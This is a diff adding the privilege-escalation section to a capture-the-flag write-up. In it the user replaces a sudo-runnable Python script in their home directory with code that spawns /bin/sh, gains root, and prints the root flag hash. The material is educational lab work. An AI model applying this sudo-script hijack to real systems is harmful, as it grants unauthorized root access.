@@ -206,6 +206,97 @@ meliodas@ubuntu:~$ cat user.txt
 
 ## Vertical Escalation
 
+Focusing on vertical escalation now, we can run the ```sudo -l``` command to list all sudo permissions for the current user, where we'll see that ```meliodas``` can run the ```bak.py``` file as ```sudo```.
 
+```
+meliodas@ubuntu:~$ sudo -l
+Matching Defaults entries for meliodas on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User meliodas may run the following commands on ubuntu:
+    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
+```
+
+If we ```cat``` the ```bak.py``` file in ```meliodas``` home directory we'll see that it's not useful to us, so running it as sudo won't help us.
+
+```
+meliodas@ubuntu:~$ cat bak.py
+#!/usr/bin/env python
+import os
+import zipfile
+
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file))
+
+if __name__ == '__main__':
+    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
+    zipdir('/var/www/html', zipf)
+    zipf.close()
+```
+
+We can't edit this file because we only have read privileges. We can, however, delete this file and create another with the same name, that **does** help us elevate our privileges.
+
+```
+meliodas@ubuntu:~$ rm bak.py
+rm: remove write-protected regular file 'bak.py'? yes
+```
+
+Once we've removed the file we'll recreate it using the ```nano``` text editor.
+
+```meliodas@ubuntu:~$ nano bak.py```
+
+In the editor we'll insert the following lines of ```Python``` code.
+
+```
+import os
+os.system("/bin/sh")
+```
+
+If you ```cat``` the ```bak.py``` file after editing, it should look like this...
+
+```
+meliodas@ubuntu:~$ cat bak.py
+
+import os
+os.system("/bin/sh")
+```
+
+This program if ran as ```sudo``` won't drop ```root``` privileges, so all we have to do now is run it.
+
+```sudo /usr/bin/python3 /home/meliodas/bak.py```
+
+We can verify we're root now with ```whoami```.
+
+```
+# whoami
+root
+```
+
+Now all we need to do is find the ```root``` flag by changing into the ```root``` directory and listing all contents there.
+
+```
+# cd /root
+
+# ls -la
+
+total 28
+drwx------  3 root root 4096 Aug 24  2019 .
+drwxr-xr-x 22 root root 4096 Aug 24  2019 ..
+-rw-------  1 root root   43 Aug 24  2019 .bash_history
+-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
+drwxr-xr-x  2 root root 4096 Aug 23  2019 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-rw-r--r--  1 root root   33 Aug 23  2019 root.txt
+```
+
+And finally, once we've found the ```root.txt``` file, we can ```cat``` it to read the flag.
+
+```
+# cat root.txt
+e8c8c6c256c35515d1d344ee0488c617
+```
 
 [Back To Top](#library "Jump To Top")
